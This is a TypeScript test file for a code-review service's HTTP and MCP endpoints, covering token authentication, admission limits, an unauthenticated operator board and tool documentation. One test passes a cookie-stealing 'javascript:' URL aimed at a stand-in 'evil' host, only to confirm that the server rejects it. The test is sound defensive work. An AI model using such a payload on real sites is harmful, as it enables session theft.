/**
 * The HTTP surface, started for real.
 *
 * Proves the service binds, authenticates, and answers — the wiring I could not
 * otherwise claim anything about. It does not prove a review runs; that needs a
 * model and a repository.
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { MAX_OPEN_REVIEWS } from "../core/admission.ts";
import { initialState } from "../core/ladder.ts";
import type { ReviewState } from "../core/review-state.ts";
import { STALE_HOURS, STALE_GRACE_DAYS } from "../ops/retention.ts";
import { BOARD_PAGE } from "./board-page.ts";
import { DEFAULT_HEARTBEAT } from "../ops/heartbeat.ts";
import { grantToken, hashToken, revokeByPrefix } from "../mcp/auth.ts";
import { Store } from "../store/store.ts";
import { everyClientDocument, TOOL_DOCS } from "../mcp/docs.ts";
import { startHttp } from "./http.ts";

let store: Store;
let close: () => void;
let base: string;
let token: string;
let otherToken: string;
let repoId: string;
let port: number;

/**
 * A DIFFERENT PORT PER TEST.
 *
 * One fixed port, rebound by every `beforeEach`, leaves fetch's connection pool
 * holding keep-alive sockets to a server that has just been closed — so the next
 * request fails with ECONNRESET for reasons having nothing to do with what is under
 * test. It only became likely once there were enough tests, and it failed two of them
 * intermittently. `listen(0)` would be tidier but binds asynchronously, so the port is
 * not knowable when this returns.
 */
let portSeq = 39_517;
const nextPort = () => (port = ++portSeq);

beforeEach(() => {
  store = new Store(":memory:");
  const repo = store.upsertRepo("demo", "git@x:demo.git");
  const other = store.upsertRepo("other", "git@x:other.git");
  repoId = repo.id;
  token = grantToken(store, repo.id, "alice");
  otherToken = grantToken(store, other.id, "bob");

  const server = startHttp(
    store,
    {
      store,
      worktreeFor: async () => "/tmp/nowhere",
      enqueue: () => undefined,
      attest: async () => "lore: attested",
    },
    {
      port: nextPort(),
      host: "127.0.0.1",
      heartbeat: { ...DEFAULT_HEARTBEAT, dataDir: "/tmp" },
      allowMetered: false,
    },
  );
  close = server.close;
  base = `http://127.0.0.1:${port}`;
});

afterEach(() => {
  close();
  store.close();
});

// lore-ok[ce28e08f]: raised by the model in its own words, alongside semgrep's
// version of the same thing below, so it gets its own marker. The claim is that
// review data travels in plaintext where a local process could read it. Nothing
// travels: the server is created in `beforeEach`, bound to 127.0.0.1 on an ephemeral
// port, answered by the same process, and closed in `afterEach`. The payloads are
// this file's own fixtures — no branch name, repository URL or finding from any real
// review exists inside a unit test.
//
// The production bind is the one that carries real data, and it is governed
// separately and deliberately: LORE_BIND in deploy/docker-compose.yml defaults to
// loopback PRECISELY because there is no TLS in front of it, and that file says so
// in the same words.
//
// lore-ok[d6d9cd72]: `base` is an ephemeral loopback server this test starts itself
// — `http://127.0.0.1:${PORT}`, torn down in afterEach. There is no network hop to
// intercept, so there is no plaintext to protect; adding TLS here would exercise
// node's TLS stack rather than the MCP handler under test. The rule that fired is
// `typescript.react.security.react-insecure-request`, a React browser-fetch rule,
// matched against a Node test file by URL shape alone.
//
// The production bind is the one that matters and it is governed separately: see
// LORE_BIND in deploy/docker-compose.yml, which defaults to loopback precisely
// because there is no TLS in front of it.
const mcp = (body: unknown, bearer?: string) =>
  fetch(`${base}/mcp`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      accept: "application/json, text/event-stream",
      ...(bearer === undefined ? {} : { authorization: `Bearer ${bearer}` }),
    },
    body: JSON.stringify(body),
  });

/** Tool results come back as an SSE frame wrapping JSON-RPC wrapping JSON text. */
const callTool = async (name: string, args: Record<string, unknown>): Promise<Record<string, unknown>> => {
  const res = await mcp(
    { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } },
    token,
  );
  const body = await res.text();
  const line = body.split("\n").find((l) => l.startsWith("data:"));
  expect(line).toBeDefined();
  const rpc = JSON.parse((line ?? "").slice("data:".length)) as {
    result?: { content?: { text?: string }[] };
    error?: unknown;
  };
  expect(rpc.error).toBeUndefined();
  return JSON.parse(rpc.result?.content?.[0]?.text ?? "{}") as Record<string, unknown>;
};


describe("health and status", () => {
  it("answers /healthz without a token, so a probe needs no credential", async () => {
    const res = await fetch(`${base}/healthz`);
    expect(res.status).toBe(200);
  });

  // The operator view answers one question: is parallelism running, or silently
  // queueing? Those look identical from outside and only one is fine.
  it("reports queue depth and spend on /status", async () => {
    const body = (await (await fetch(`${base}/status`)).json()) as Record<string, unknown>;
    expect(body).toHaveProperty("queueDepth");
    expect(body).toHaveProperty("spendToday");
    expect(body).toHaveProperty("active");
  });

  it("404s an unknown path rather than falling through to MCP", async () => {
    expect((await fetch(`${base}/nope`)).status).toBe(404);
  });
});

describe("authentication", () => {
  it("refuses an unauthenticated MCP call and says what is required", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list" });
    expect(res.status).toBe(401);
    // RFC 6750: tell the client what it needs, in a header.
    expect(res.headers.get("www-authenticate")).toContain("Bearer");
  });

  it("refuses a token that is not ours", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list" }, "lore_not_a_real_token");
    expect(res.status).toBe(401);
  });

  it("refuses a revoked token", async () => {
    store.db.prepare("UPDATE token SET revoked_at = ? WHERE principal = 'alice'").run(new Date().toISOString());
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list" }, token);
    expect(res.status).toBe(401);
  });

  it("accepts a valid token", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list" }, token);
    expect(res.status).toBeLessThan(400);
  });

  // Two teammates on one tailnet must not read each other's repos. The tokens are
  // for scoping, not perimeter — the network already does perimeter.
  it("binds each token to its own repo", async () => {
    expect(token).not.toBe(otherToken);
    const mine = store.db.prepare("SELECT repo_id FROM token WHERE principal = 'alice'").get() as Record<string, string>;
    const theirs = store.db.prepare("SELECT repo_id FROM token WHERE principal = 'bob'").get() as Record<string, string>;
    expect(mine["repo_id"]).not.toBe(theirs["repo_id"]);
  });
});

/**
 * NO REPLY MENTIONS A SUBSCRIPTION, IN A FIELD OR IN ITS PROSE (D-103).
 *
 * `docs.test.ts` guards the documented texts, and this slipped straight past it: the
 * `note` strings are built in `server.ts`, not in `TOOL_DOCS`, so removing the subscribe
 * fields left `review_start` answering "SEND THE `subscribe` CALL BELOW" with no such
 * field in the reply. A response telling a client to do something the same response makes
 * impossible — shipped, and caught only by reading lore's own `review_start` output.
 *
 * So the check is at the wire, over what a client actually receives.
 */
describe("replies ask a client to poll and nothing else", () => {
  it("carries no subscription field, and no prose pointing at one", async () => {
    store.upsertRepo("demo2", "git@x:demo2.git");
    const started = await callTool("review_start", {
      branch: "feat/reply-shape",
      into: "main",
      ticket: "t",
    });

    // Not a key...
    expect(Object.keys(started).filter((k) => /subscri/i.test(k))).toStrictEqual([]);
    // ...and not a sentence. The note is the string a client is guaranteed to read.
    expect(JSON.stringify(started)).not.toMatch(/subscri/i);

    // And it still says the thing it must: how long to wait. The NUMBER is conditional —
    // a repository with too few completed rounds gets no median rather than an invented
    // one — but the sentence is not, and whenever a number IS offered it is bounded.
    expect(String(started["check_back_note"]), "always says when to come back").toMatch(/ONE call|come back/i);
    if (started["check_back_after_ms"] !== undefined) {
      expect(Number(started["check_back_after_ms"]), "never two minutes or more").toBeLessThan(120_000);
    }
  });

  // 76470c5e/004465f7, found by lore's own review: this fixture is a fresh Store
  // with zero completed rounds of any tier, so check_back_after_ms is GUARANTEED
  // absent (pace.ts's own MIN_RUNS) — the state every freshly provisioned repo's
  // first review_start is in. The reply's own `note` field used to tell a client
  // "ONE call when `check_back_after_ms` says" unconditionally, naming a field the
  // same reply omits — the same defect class this project's own comment, right
  // above the note in server.ts, already names ("a reply telling a client to do
  // something the same reply makes impossible").
  it("does not tell a client to wait on a field the same reply omits", async () => {
    store.upsertRepo("demo3", "git@x:demo3.git");
    const started = await callTool("review_start", { branch: "feat/no-median-yet", into: "main", ticket: "t" });

    expect(started["check_back_after_ms"], "the fixture has zero completed rounds").toBeUndefined();
    expect(
      String(started["note"]),
      "must not name check_back_after_ms as the unconditional wait signal when it is absent",
    ).not.toMatch(/ONE call when `check_back_after_ms` says/);
    expect(String(started["note"]), "must still point at the field that is always present").toContain(
      "check_back_note",
    );
  });

  it("says the same for a poll that is still waiting", async () => {
    store.createReview({
      id: "revWaiting", repoId, principal: "alice", branch: "feat/waiting", intoRef: "main",
      ticket: "t", type: "code-arch", state: "running", ladder: initialState(),
    });
    const polled = await callTool("review_poll", { review_id: "revWaiting" });
    expect(JSON.stringify(polled)).not.toMatch(/subscri/i);
  });
});

/**
 * ADMISSION CONTROL: refused at the door, never queued in the middle (D-98).
 *
 * Vany: *"there may be no situation where a job waits for the session in opencode — launch
 * immediately. If you need limits, okay: do not accept a request if there are already 128
 * reviews going."* The semaphore that used to make a round wait for a model slot is gone,
 * and this is what replaced it. The difference that matters is not the number: a client
 * that is REFUSED knows, and can cancel something or come back; a client whose review is
 * silently waiting sees `queued` and a clock and cannot tell that from a wedged service.
 */
describe("the service refuses work rather than queueing it invisibly", () => {
  const start = (branch: string) =>
    mcp(
      {
        jsonrpc: "2.0", id: 1, method: "tools/call",
        params: { name: "review_start", arguments: { branch, into: "main", ticket: "t" } },
      },
      token,
    ).then((r) => r.text());

  it("accepts while there is room", async () => {
    expect(await start("feat/room")).toContain("review_id");
  });

  it("refuses once the service is full, and says how to make room", async () => {
    // One under the limit, so the next call is the first that must be refused.
    for (let i = 0; i < MAX_OPEN_REVIEWS; i++) {
      store.createReview({
        id: `full${i}`, repoId, principal: "alice", branch: `feat/full-${i}`, intoRef: "main",
        ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
      });
    }

    const body = await start("feat/one-too-many");
    expect(body).toContain("lore is full");
    expect(body, "the count and the limit, not just a refusal").toContain(String(MAX_OPEN_REVIEWS));
    // THE REMEDY, because a client that cannot act on a refusal will simply retry it.
    expect(body).toContain("review_cancel");
    // NOTHING WAS STARTED — no half-created review, no id promised to anyone.
    const row = store.db
      .prepare("SELECT COUNT(*) c FROM review WHERE branch = 'feat/one-too-many'")
      .get() as { c: number };
    expect(Number(row.c), "a refusal must leave nothing behind").toBe(0);
  });

  /**
   * Finished reviews do not hold the door. Otherwise the limit would be reached once and
   * never released, and a service that has done 128 reviews would stop for ever.
   */
  it("counts only reviews that have not finished", async () => {
    for (let i = 0; i < MAX_OPEN_REVIEWS + 10; i++) {
      store.createReview({
        id: `done${i}`, repoId, principal: "alice", branch: `feat/done-${i}`, intoRef: "main",
        ticket: "t", type: "code-arch", state: "passed", ladder: initialState(),
      });
    }
    expect(await start("feat/after-many")).toContain("review_id");
  });
});

/**
 * A PERSON DECIDING FROM THE BOARD (D-99) — the one thing this page can change.
 *
 * `needs_human` is the state where nothing in the system can proceed, so the reader of
 * the page IS the mechanism. Until now the only way to act was for an agent to relay the
 * decision over MCP; the button lets the person who is already looking at the question
 * answer it, and the client is told a person answered so it does not go and ask again.
 */
describe("deciding a contradiction from the board", () => {
  const teach = (statement: string, provenance: string) =>
    store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement, why: "w",
      path: "src", cwe: undefined, provenance, sourceBlob: undefined, confidence: undefined,
    });

  const parked = (id: string) => {
    store.createReview({
      id, repoId, principal: "alice", branch: `feat/${id}`, intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
  };

  const post = (body: unknown) =>
    fetch(`${base}/board/decide`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });

  it("retires the losing statement, resumes the reviews, and tells their clients", async () => {
    const left = teach("Holds are released by capture()", "t2 on feat/x");
    const right = teach("Holds are released only by settlement", "koray");
    store.recordConflict(repoId, left.id, right.id);
    parked("revA");
    parked("revB");

    const res = await post({ repo_id: repoId, keep: left.id, retire: right.id });
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ resolved: true, resumed: 2, stillBlocking: 0 });

    // The reviews are moving again...
    expect(store.getReview("revA", "alice")?.state).toBe("queued");
    // ...and the losing statement is retired rather than deleted, so the decision stays
    // reconstructable.
    expect(store.knowledgeFor(repoId).map((k) => k.id)).not.toContain(right.id);
    expect(store.openConflicts(repoId)).toStrictEqual([]);

    // THE HALF THAT MATTERS TO THE CLIENT. Without it a resume is indistinguishable from
    // an ordinary requeue, and the client's standing instruction for needs_human is to go
    // and ask its user — who has already answered.
    const poll = await callTool("review_poll", { review_id: "revA" });
    expect(String(poll["human_decision"])).toMatch(/A person answered/);
    expect(String(poll["human_decision"]), "and what they decided").toContain(left.id);
    expect(String(poll["human_decision"]), "so it does not ask again").toMatch(/do not need to raise it/i);
  });

  /**
   * A parked review is blocked by EVERY open conflict in its repository, not by one it
   * could name. Resuming while another stands buys a paid round and parks it again —
   * while reporting progress that is not happening.
   */
  it("resumes nothing while another contradiction is still open, and says so", async () => {
    const a1 = teach("A", "x");
    const a2 = teach("not A", "y");
    const b1 = teach("B", "x");
    const b2 = teach("not B", "y");
    store.recordConflict(repoId, a1.id, a2.id);
    store.recordConflict(repoId, b1.id, b2.id);
    parked("revC");

    const out = (await (await post({ repo_id: repoId, keep: a1.id, retire: a2.id })).json()) as {
      resumed: number;
      stillBlocking: number;
    };
    expect(out).toMatchObject({ resumed: 0, stillBlocking: 1 });
    expect(store.getReview("revC", "alice")?.state, "still parked, honestly").toBe("needs_human");
  });

  it("refuses a decision about a conflict that is not open", async () => {
    const a = teach("A", "x");
    const b = teach("B", "y");
    const res = await post({ repo_id: repoId, keep: a.id, retire: b.id });
    expect(res.status).toBe(409);
    expect(JSON.stringify(await res.json())).toContain("no open conflict");
  });

  it("requires all three ids rather than guessing", async () => {
    expect((await post({ repo_id: repoId, keep: "only-one" })).status).toBe(400);
  });

  // GET would let a decision be made by anything that follows a link — a prefetch, a
  // crawler, a chat client unfurling a URL. Retiring a statement is not a safe method.
  it("is POST only", async () => {
    const res = await fetch(`${base}/board/decide`);
    expect(res.status).toBe(405);
  });

  // 8576fa61, found by lore's own review: a malformed body used to escape
  // `JSON.parse` uncaught into the generic 500 in `createServer`'s own catch — the
  // same status a genuine server bug gets, on an endpoint reachable by anything on
  // the tailnet with no credential at all.
  it("answers a malformed body with 400, not the generic 500", async () => {
    const res = await fetch(`${base}/board/decide`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "not json at all {",
    });
    expect(res.status, "a caller's bad body is a caller fault, not a server fault").toBe(400);
    expect((await res.json() as { error?: string }).error, "still a real, parseable error body").toBeTruthy();
  });
});

/**
 * The operator board (D-96), through the real server.
 *
 * `/status` answers the same question for a monitor; this answers it for a person, and
 * the fact worth testing is that it answers WITHOUT a token — deliberately, and stated in
 * the route's own comment, because a board you have to authenticate to is one you do not
 * open at 3am when the thing is on fire.
 */
describe("the operator board", () => {
  const review = (id: string, state: string, branch: string) =>
    store.createReview({
      id, repoId, principal: "alice", branch, intoRef: "main",
      ticket: "t", type: "code-arch", state: state as never, ladder: initialState(),
    });

  it("serves the page at / with no credential", async () => {
    const res = await fetch(`${base}/`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/html");
    const html = await res.text();
    expect(html).toContain("<title>lore — board</title>");
    // Self-contained on purpose: a board about a wedged service must not need to fetch
    // anything from anywhere to render.
    expect(html, "no external script or stylesheet").not.toMatch(/src="http|href="http/);
  });

  it("serves the same snapshot as JSON, for curl and for scripts", async () => {
    review("revBoard", "running", "feat/board");
    const res = await fetch(`${base}/board.json`);
    const body = (await res.json()) as { reviews: { id: string }[] };
    expect(body.reviews.map((r) => r.id)).toContain("revBoard");
  });

  /**
   * THE PAGE IS AN UNTYPED CLIENT OF THIS PAYLOAD, so a renamed field breaks it silently
   * — the board would render `undefined` where a branch name goes and nothing would fail.
   * TypeScript cannot see inside a template string; this is the substitute for that.
   */
  it("emits no field the page does not read, at any level", async () => {
    review("revBoard", "running", "feat/board");
    const run = store.openTierRun("revBoard", "t1", 1, new Date().toISOString());
    store.closeTierRun(run, "findings", []);
    store.recordFinding("revBoard", {
      fingerprint: "bf1", file: "a.ts", line: 3, symbol: "s", severity: "high",
      claim: "c", evidence: "e", failureScenario: "f", cwe: "CWE-89",
      origin: "t1", round: 1, firstSeen: new Date().toISOString(),
    });
    const body = (await (await fetch(`${base}/board.json`)).json()) as Record<string, unknown>;

    const unread = (o: Record<string, unknown>) => Object.keys(o).filter((k) => !BOARD_PAGE.includes(k));

    expect(unread(body), "board.json fields the page never mentions").toStrictEqual([]);

    const rev = (body["reviews"] as Record<string, unknown>[])[0] ?? {};
    expect(unread(rev), "per-review fields the page never mentions").toStrictEqual([]);

    // Three levels deep, and each one had to actually be populated above — a drift check
    // over an absent object is a check that passes because there was nothing to compare.
    const tier = ((rev["tiers"] as Record<string, unknown>[]) ?? [])[0] ?? {};
    expect(Object.keys(tier).length, "no tier run to check").toBeGreaterThan(0);
    expect(unread(tier), "per-tier fields the page never mentions").toStrictEqual([]);

    const f = ((tier["findings"] as Record<string, unknown>[]) ?? [])[0] ?? {};
    expect(Object.keys(f).length, "no finding to check").toBeGreaterThan(0);
    expect(unread(f), "per-finding fields the page never mentions").toStrictEqual([]);
  });

  // lore-ok[240a9efa]: found by lore's own review. The route comment two screens up
  // claims the unauthenticated board "deliberately does NOT carry finding TEXT" —
  // this repository's OWN development rule is that a claim about behaviour must be
  // checked mechanically where one is possible, so this pins it: /board.json, which
  // answers with no token, must never carry the fields that would make that claim
  // false, however the store itself records them.
  it("never carries finding text on the unauthenticated board", async () => {
    review("revBoardText", "running", "feat/board-text");
    const run = store.openTierRun("revBoardText", "t1", 1, new Date().toISOString());
    store.closeTierRun(run, "findings", []);
    store.recordFinding("revBoardText", {
      fingerprint: "bf2", file: "secret.ts", line: 3, symbol: "s", severity: "high",
      claim: "a defect nobody but the branch owner should read",
      evidence: "the proof that would leak", failureScenario: "the scenario that would leak",
      cwe: "CWE-89", origin: "t1", round: 1, firstSeen: new Date().toISOString(),
    });

    const text = await (await fetch(`${base}/board.json`)).text();

    expect(text, "the finding must actually be in the response to make this check meaningful").toContain("bf2");
    expect(text).not.toContain("a defect nobody but the branch owner should read");
    expect(text).not.toContain("the proof that would leak");
    expect(text).not.toContain("the scenario that would leak");
  });

  /**
   * The branch links to the pull request, which is the whole reason to ask for it: a
   * branch name is not clickable and does not say which forge it lives on.
   */
  it("carries the pull request a client named, and nothing when it named none", async () => {
    store.createReview({
      id: "revPr", repoId, principal: "alice", branch: "feat/pr", intoRef: "main",
      ticket: "t", type: "code-arch", state: "running", ladder: initialState(),
      pullRequest: "https://github.com/o/r/pull/42",
    });
    review("revNoPr", "running", "review/deadbeef");

    const body = (await (await fetch(`${base}/board.json`)).json()) as { reviews: Record<string, unknown>[] };
    const by = Object.fromEntries(body.reviews.map((r) => [r["review_id"] ?? r["id"], r]));
    expect(by["revPr"]?.["pullRequest"]).toBe("https://github.com/o/r/pull/42");
    // Absent, not empty string: lore's own reviews run on scratch refs and never have one,
    // and the page must render plain text rather than a dead link.
    expect(by["revNoPr"]).not.toHaveProperty("pullRequest");
  });

  /**
   * A STORED URL BECOMES AN href ON A PAGE THAT NEEDS NO CREDENTIAL.
   *
   * So `javascript:` in it would be a script somebody else chose, running in the
   * operator's browser, on the one page they open when something is wrong. The schema
   * refuses it at the door; this proves the door is shut.
   */
  it("refuses a pull request URL that is not http(s)", async () => {
    const res = await mcp(
      {
        jsonrpc: "2.0", id: 1, method: "tools/call",
        params: {
          name: "review_start",
          arguments: {
            branch: "feat/x", into: "main", ticket: "t",
            pull_request: "javascript:fetch('http://evil/'+document.cookie)",
          },
        },
      },
      token,
    );
    const body = await res.text();
    expect(body).toContain("pull_request must be an http(s) URL");
    // And nothing was created on the way to refusing it. Read as a number: node:sqlite
    // hands back a null-prototype row, which `toStrictEqual` compares by prototype too.
    const row = store.db.prepare("SELECT COUNT(*) c FROM review WHERE branch = 'feat/x'").get() as
      { c: number };
    expect(Number(row.c), "a refused review must not exist").toBe(0);
  });

  /**
   * A STREAM CARRIES NO HISTORY — the same lesson the MCP subscription docs lead with.
   * A watcher that attached one tick after something happened would otherwise sit in
   * front of a blank board until the next change, which on a quiet service is for ever.
   */
  it("pushes the current picture the moment a watcher attaches", async () => {
    review("revBoard", "running", "feat/board");

    const ctl = new AbortController();
    try {
      const res = await fetch(`${base}/board/events`, { signal: ctl.signal });
      expect(res.headers.get("content-type")).toContain("text/event-stream");
      const frame = await firstFrame(res);
      expect(frame.reviews.map((r) => r.id)).toContain("revBoard");
    } finally {
      ctl.abort();
    }
  });

  it("pushes again when something changes", async () => {
    review("revBoard", "running", "feat/board");

    const ctl = new AbortController();
    try {
      const res = await fetch(`${base}/board/events`, { signal: ctl.signal });
      const reader = frames(res);
      const before = await reader();
      expect(before.reviews.find((r) => r.id === "revBoard")?.state).toBe("running");

      store.updateReview("revBoard", { state: "findings_ready" });

      const after = await reader();
      expect(after.reviews.find((r) => r.id === "revBoard")?.state).toBe("findings_ready");
    } finally {
      ctl.abort();
    }
  }, 15_000);
});

/** Read SSE `data:` frames off a response, one call per frame. */
function frames(res: Response): () => Promise<{ reviews: { id: string; state: string }[] }> {
  const reader = (res.body as ReadableStream<Uint8Array>).getReader();
  const decoder = new TextDecoder();
  let buffered = "";
  return async () => {
    for (;;) {
      const nl = buffered.indexOf("\n\n");
      if (nl >= 0) {
        const chunk = buffered.slice(0, nl);
        buffered = buffered.slice(nl + 2);
        const line = chunk.split("\n").find((l) => l.startsWith("data:"));
        // A comment frame (`: still here`) is not news; keep reading.
        if (line !== undefined) return JSON.parse(line.slice("data:".length)) as never;
        continue;
      }
      const { value, done } = await reader.read();
      if (done) throw new Error("the board stream ended before a frame arrived");
      buffered += decoder.decode(value, { stream: true });
    }
  };
}

const firstFrame = async (res: Response) => await frames(res)();

describe("MCP surface", () => {
  /** What the wire actually offers — the only list that cannot be stale. */
  const registered = async (): Promise<string[]> => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list", params: {} }, token);
    // An SSE frame wrapping the JSON-RPC reply, exactly as `callTool` unwraps it.
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:"));
    expect(line, "tools/list returned no SSE data frame").toBeDefined();
    const rpc = JSON.parse((line ?? "").slice("data:".length)) as { result?: { tools?: { name: string }[] } };
    const names = (rpc.result?.tools ?? []).map((t) => t.name).sort();
    // A parse that yields nothing would make every assertion below vacuously true.
    expect(names.length, "no tools came back at all").toBeGreaterThan(0);
    return names;
  };

  it("lists the tools an agent needs to drive a review", async () => {
    for (const name of [
      "review_start",
      "review_poll",
      "review_submit",
      "review_attest",
      "review_inbox",
      "review_vex",
      "knowledge_query",
      "knowledge_teach",
      "knowledge_resolve",
      "knowledge_escalate",
    ]) {
      expect(await registered()).toContain(name);
    }
  });

  /**
   * A DOC MAY ONLY NAME A TOOL THAT EXISTS — checked against `tools/list`, never
   * against a list written out by hand.
   *
   * This check lived in `docs.test.ts` against ten names typed into the test file. The
   * server registers twelve. So it aged into the opposite of a drift guard: a doc telling
   * a client to call `review_cancel`, a tool that has existed for weeks, was failed for
   * naming something that does not exist. A guard holding its own copy of the truth ends
   * up defending the copy — and the direction of that failure is the worst available,
   * because it blocks the fix and blesses the stale text.
   *
   * EVERY DOCUMENT, from `everyClientDocument()`. The first version of this move scanned
   * `TOOL_DOCS` alone, which quietly dropped `REVIEW_PROMPT_TEXT` — the text that drives
   * the whole review loop, naming seven tools — and every resource doc, while the comment
   * left behind in `docs.test.ts` assured the next maintainer the guard had merely moved.
   * Raised by lore's own t2 against this change.
   */
  it("names no tool the server does not register, in any document", async () => {
    const tools = await registered();
    // Parameter names share the prefix and are not tools.
    const NOT_TOOLS = new Set(["review_id"]);
    const corpus = everyClientDocument();
    // The corpus itself is asserted, because a guard over an empty list passes loudest.
    expect(corpus.length, "no documents to check").toBeGreaterThan(5);
    const offenders = corpus.flatMap(([name, text]) =>
      [...new Set(text.match(/\b(?:review|knowledge)_[a-z_]+/g) ?? [])]
        .filter((n) => !NOT_TOOLS.has(n) && !tools.includes(n))
        .map((n) => `${name}: ${n}`),
    );
    expect(offenders, "documentation names tools the server does not register").toStrictEqual([]);
  });

  /**
   * ...AND EVERY TOOL THAT EXISTS ARRIVES WITH ITS DOCUMENTATION ATTACHED.
   *
   * The other direction, and the one worth having: a client learns a tool's name from
   * the protocol, so the question is never "is it mentioned elsewhere" — it is whether
   * the description came with it. An empty one is a tool an agent can see and cannot
   * use, which for this service is the same as not shipping it (spec/agent-docs.md §1).
   *
   * Length rather than mere presence, because `description: ""` and a typo'd
   * `TOOL_DOCS.<key>` both yield something technically present.
   */
  it("ships every registered tool with real documentation attached", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list", params: {} }, token);
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:"));
    const rpc = JSON.parse((line ?? "").slice("data:".length)) as {
      result?: { tools?: { name: string; description?: string }[] };
    };
    const thin = (rpc.result?.tools ?? [])
      .filter((t) => (t.description ?? "").length < 200)
      .map((t) => `${t.name}(${(t.description ?? "").length})`);
    expect(thin, "tools an agent can see but cannot learn to use").toStrictEqual([]);
  });

  it("exposes the live-data resource templates, not just the static docs", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "resources/templates/list", params: {} }, token);
    const text = await res.text();
    expect(text).toContain("lore://review/{review_id}");
    expect(text).toContain("lore://knowledge/");
  });

  it("ships the documentation an agent reads, not just the tool names", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/list", params: {} }, token);
    const text = await res.text();

    // The failure modes these sentences exist to prevent are the whole reason the
    // docs are treated as an interface rather than as comments. Matched on
    // substrings that do not wrap in the source — a wrapped phrase would make this
    // test fail for formatting rather than for content.
    expect(text).toContain("Returns ONLY NEW findings");
    expect(text).toContain("ONLY `passed` means the branch is clean");
    expect(text).toContain("Do not summarise it");
    expect(text).toContain("needs_human");
  });

  it("exposes the review prompt as a slash command", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "prompts/list", params: {} }, token);
    expect(await res.text()).toContain("review");
  });

  it("exposes the assistant-facing doc resources", async () => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "resources/list", params: {} }, token);
    const text = await res.text();
    expect(text).toContain("lore://docs/workflow");
    expect(text).toContain("lore://docs/lore-ok");
  });
});

/**
 * Severity ordering, through the real tools rather than the store (D-50).
 *
 * The store test proves the query; these prove the two responses an agent actually
 * triages on. Both were wrong: SQLite orders TEXT lexicographically, so "low" came
 * back ahead of "medium", and `review_inbox` reported the first row as `highest`.
 */
describe("findings are ranked worst first", () => {
  const finding = (fp: string, severity: string, file: string) => ({
    fingerprint: fp,
    file,
    line: 1,
    symbol: "s",
    severity: severity as "high" | "medium" | "low",
    claim: `claim ${fp}`,
    evidence: "evidence",
    failureScenario: "scenario",
    origin: "t1",
    round: 1,
    firstSeen: "2026-08-03T00:00:00.000Z",
  });

  beforeEach(() => {
    store.createReview({
      id: "rev1",
      repoId,
      principal: "alice",
      branch: "feat/x",
      intoRef: "main",
      ticket: "do the thing",
      type: "code-arch",
      state: "findings_ready",
      ladder: initialState(),
    });
    // Deliberately no `high`: with a high present the old code was accidentally
    // right, which is why the inverted medium/low pair went unnoticed.
    store.recordFinding("rev1", finding("l1", "low", "a.ts"));
    store.recordFinding("rev1", finding("m1", "medium", "b.ts"));
  });

  it("returns poll findings worst first", async () => {
    const out = await callTool("review_poll", { review_id: "rev1" });
    const got = (out["new_findings"] as { severity: string }[]).map((f) => f.severity);
    expect(got).toStrictEqual(["medium", "low"]);
  });

  /**
   * THE INBOX CONSUMES NOTHING, and it used to consume exactly as `review_poll` does.
   *
   * `undelivered` + `markDelivered` is the POLL's contract: it hands over deltas and
   * takes them off the queue, which is why polling somebody else's review is refused
   * (D-78). The inbox did the same while its own documentation AND `smoke.mjs` both said
   * it did not — so a read-only health check emptied the delta queue of every review it
   * listed, and the owner was shown nothing the next time it polled.
   *
   * The fix shipped with no regression test anywhere, which is how it could silently come
   * back. Two calls and the same answer is the whole property.
   */
  it("does not consume what it lists, however often it is called", async () => {
    const first = await callTool("review_inbox", {});
    const again = await callTool("review_inbox", {});
    const count = (o: Record<string, unknown>) =>
      (o["reviews"] as { new_findings: number }[]).map((r) => r.new_findings);
    expect(count(first)).toStrictEqual([2]);
    expect(count(again), "a second call must see exactly what the first saw").toStrictEqual([2]);

    // And the poll, which IS the handover, still gets everything.
    const poll = await callTool("review_poll", { review_id: "rev1" });
    expect((poll["new_findings"] as unknown[]).length).toBe(2);
  });

  // ...and the poll's own contract is unchanged: it consumes, so a second call is empty.
  it("leaves review_poll consuming, which is what the inbox must not do", async () => {
    await callTool("review_poll", { review_id: "rev1" });
    const second = await callTool("review_poll", { review_id: "rev1" });
    expect((second["new_findings"] as unknown[]).length).toBe(0);
  });

  it("reports the worst severity in the inbox, not the first row", async () => {
    const out = await callTool("review_inbox", {});
    const reviews = out["reviews"] as { highest: string; findings: { severity: string }[] }[];
    expect(reviews).toHaveLength(1);
    // This said "low" for a review whose worst finding is medium.
    expect(reviews[0]?.highest).toBe("medium");
    expect(reviews[0]?.findings.map((f) => f.severity)).toStrictEqual(["medium", "low"]);
  });

  // A finding can be raised and settled inside one round — D-51 carries a
  // justification this repo already ratified into a later review and accepts it
  // with nobody answering. It is still new to the caller, so it is still
  // delivered; what must not survive is the instruction to justify it.
  //
  // Found by driving lore's own review over MCP: a semgrep CWE-319 on a loopback
  // test server came back among `new_findings` carrying `justify_with`, having
  // been auto-settled seconds earlier. Writing the lore-ok it asked for would have
  // duplicated one already in the file, and `review_submit` warns in its own docs
  // that every word submitted is fresh surface for the next tier.
  it("does not ask for a justification for a finding already settled", async () => {
    store.recordVerdict("rev1", {
      fingerprint: "m1",
      verdict: "justified-accepted",
      rationale: "carried forward from an earlier review of this repo",
      scope: undefined,
      tier: "t1",
      round: 1,
    });

